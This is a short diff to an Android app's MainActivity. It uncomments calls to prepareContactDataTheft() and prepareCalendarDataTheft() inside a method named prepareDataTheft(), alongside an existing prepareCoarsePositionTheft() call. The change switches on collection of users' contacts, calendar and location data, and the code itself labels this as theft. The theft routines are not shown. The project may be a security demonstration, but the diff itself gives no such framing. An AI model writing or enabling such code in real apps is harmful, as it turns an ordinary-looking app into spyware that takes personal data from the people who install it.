@@ -59,8 +59,8 @@ public class MainActivity extends AppCompatActivity {
      * Mostly taken from https://developer.android.com/training/permissions/requesting#java
      */
     public void prepareDataTheft() {
-        // prepareContactDataTheft();
-        // prepareCalendarDataTheft();
+        prepareContactDataTheft();
+        prepareCalendarDataTheft();
         prepareCoarsePositionTheft();
     }
 
